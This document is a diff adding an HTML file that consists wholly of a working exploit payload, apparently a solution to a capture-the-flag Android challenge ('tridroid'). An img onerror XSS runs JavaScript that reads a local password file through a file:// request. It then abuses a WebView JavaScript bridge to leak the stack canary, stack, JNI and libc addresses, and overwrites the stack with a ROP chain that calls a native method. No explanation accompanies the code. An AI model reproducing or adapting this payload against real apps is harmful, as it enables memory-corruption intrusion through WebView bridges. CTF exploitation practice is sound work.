@@ -1,0 +1,59 @@
+<img src=# onerror="
+BigInt.prototype.hex=function() {return '0x'+this.toString(16);};
+Number.prototype.hex  =function() {return '0x'+this.toString(16);};
+function unhex(s){let ret='';for (let i=0; i < s.length/2; ++i) {ret += String.fromCharCode(parseInt(s.substr(i*2, 2), 16));}return ret;}
+function enhex(s) {let ret='';for (let i=0; i < s.length; ++i) {let chr=s.charCodeAt(i);if (chr < 0x10)ret += '0'+chr.toString(16);else ret += chr.toString(16);}return ret;}
+function u64(s) {let tmp=new Uint8Array(8);for (let i=0; i < s.length; ++i) {tmp[i]=s.charCodeAt(i);}let dv=new BigUint64Array(tmp.buffer);return dv[0];}
+function p64(b) {let tmp=new ArrayBuffer(8);let dv=new DataView(tmp);dv.setBigUint64(0, b, true);let ret='';for (let i=0; i < 8; ++i) {let u8=dv.getUint8(i, true);if (u8 < 0x10)ret += '0'+u8.toString(16);else ret += u8.toString(16);}return ret;}
+let password='';
+function readTextFile(file){let rawFile=new XMLHttpRequest();rawFile.open('GET', file, false);rawFile.onreadystatechange=function (){if(rawFile.readyState === 4){if(rawFile.status === 200 || rawFile.status == 0){var allText=rawFile.responseText;password=allText;}}};rawFile.send(null);};
+let path='file:///data/data/com.google.ctf.pwn.tridroid/files/password.txt';
+readTextFile(path);
+function do_push(data) {window.bridge.manageStack(password, 'push', data);};
+function do_modify(data) {window.bridge.manageStack(password, 'modify', data);};
+function do_top() {let ret=window.bridge.manageStack(password, 'top', '');return ret;}
+function do_pop() {let ret=window.bridge.manageStack(password, 'pop', '');return ret;}
+do_push('41');
+do_modify('41'.repeat(8));
+let leak=unhex(do_top());
+leak=u64(leak.substr(8, 8));
+let base=leak - 0x16ffn;
+do_modify('41'.repeat(40));
+leak=unhex(do_top());
+let canary=u64(leak.substr(40, 8));
+let stack=u64(leak.substr(48, 8));
+do_modify('41'.repeat(0x18));
+do_modify('41'.repeat(0x17)+'00');
+do_modify('41'.repeat(0x16)+'00');
+do_modify('41'.repeat(0x10)+p64(stack-0x60n));
+do_pop();
+leak=u64(unhex(do_top()));
+let jni=leak;
+do_push('41');
+do_modify('41'.repeat(0x10)+p64(stack-0x68n));
+do_pop();
+leak=u64(unhex(do_top()));
+let jobj=leak;
+do_push('41');
+do_modify('41'.repeat(0x10)+p64(jobj)); // save obj
+do_pop();
+leak=u64(unhex(do_top()));
+let objval=leak;
+do_push('41');
+do_modify('41'.repeat(0x10)+p64(base+0x2F70n)); //malloc@got
+do_pop();
+leak=u64(unhex(do_top()));
+let libc=leak - 0x43410n;
+let pop_rdi=libc+0x42c92n;
+let pop_rsi=libc+0x42d38n;
+let pop_rdx=libc+0x46175n;
+let pop_rcx=libc+0x42e58n;
+let pop_r8_jmp_rax=libc+0x42e46n;
+let pop_rax=libc+0x45e13n;
+let mov_r9_r12_call_rbp=libc+0x8656en;
+let flag=base+0xFA0n;
+let objval_addr=stack - 80n+72n+13n*8n
+let fname=objval_addr+8n;
+let sig=fname+9n;
+do_push('41'.repeat(72)+p64(canary)+p64(0n)+p64(pop_rdi+1n)+p64(pop_rdi)+p64(jni)+p64(pop_rsi)+p64(objval_addr)+p64(pop_rdx)+p64(fname)+p64(pop_rcx)+p64(sig)+p64(flag)+p64(0x1122334455667788n)+p64(objval)+enhex('showFlag\x00()V\x00'));
+" />
